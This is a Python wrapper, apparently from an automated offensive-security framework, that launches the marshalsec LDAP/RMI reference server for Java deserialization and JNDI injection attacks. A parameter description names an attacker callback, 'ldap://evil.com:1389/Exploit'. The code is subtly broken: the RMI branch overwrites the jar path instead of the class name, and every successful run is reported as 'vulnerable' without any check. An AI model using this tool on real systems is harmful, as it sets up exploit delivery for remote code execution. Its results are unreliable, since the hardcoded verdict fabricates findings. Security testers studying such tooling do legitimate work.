# tools/marshalsec_tool.py
# Marshalsec - Java 反序列化漏洞利用工具
import os
import json
import subprocess
from typing import Dict, Any
from tool_framework import CommandLineTool


class MarshalsecTool(CommandLineTool):
    """
    Marshalsec 封装 - Java 反序列化漏洞利用工具
    支持 JNDI、RMI 等多种利用方式
    """

    def __init__(self):
        super().__init__("java")
        self.jar_path = "/app/thirdparty/marshalsec.jar"
        self.local_jar = os.path.join(os.getcwd(), "thirdparty", "marshalsec.jar")
        self.timeout = 60

    def name(self) -> str:
        return "marshalsec"

    def description(self) -> str:
        return "Java 反序列化漏洞利用工具，支持 JNDI 注入、RMI 回连等多种攻击向量"

    def supported_vulns(self) -> list:
        return ["Java Deserialization", "JNDI Injection", "RMI Exploitation", "LDAP Injection"]

    def check_available(self) -> bool:
        import shutil
        java_exists = shutil.which("java") is not None
        jar_exists = os.path.exists(self.jar_path) or os.path.exists(self.local_jar)
        return java_exists and jar_exists

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "type": {
                "type": "str",
                "description": "利用类型: JNDI, RMI, LDAP (默认 JNDI)",
                "required": False,
                "default": "JNDI"
            },
            "payload_type": {
                "type": "str",
                "description": "Payload 类型，如 JRMPClient, JRMPListener",
                "required": False,
                "default": "JRMPClient"
            },
            "callback_host": {
                "type": "str",
                "description": "回连服务器地址，如 ldap://evil.com:1389/Exploit",
                "required": True
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        exploit_type = params.get("type", "JNDI")
        payload_type = params.get("payload_type", "JRMPClient")
        callback_host = params.get("callback_host")

        if not callback_host:
            raise ValueError("必须提供 callback_host 参数")

        jar_path = self.jar_path if os.path.exists(self.jar_path) else self.local_jar

        cmd = [
            "java", "-cp", jar_path,
            "marshalsec.jndi.LDAPRefServer",
            callback_host
        ]

        # 根据类型调整命令
        if exploit_type == "RMI":
            cmd[2] = "marshalsec.jndi.RMIRefServer"

        try:
            raw_result = self._run_command(cmd, timeout=self.timeout)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            result = {
                "success": True,
                "vulnerable": True,
                "exploit_type": exploit_type,
                "payload_type": payload_type,
                "callback_host": callback_host,
                "command_used": " ".join(cmd),
                "summary": f"Marshalsec {exploit_type} 利用准备就绪"
            }

            result["stdout"] = stdout
            result["stderr"] = stderr
            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }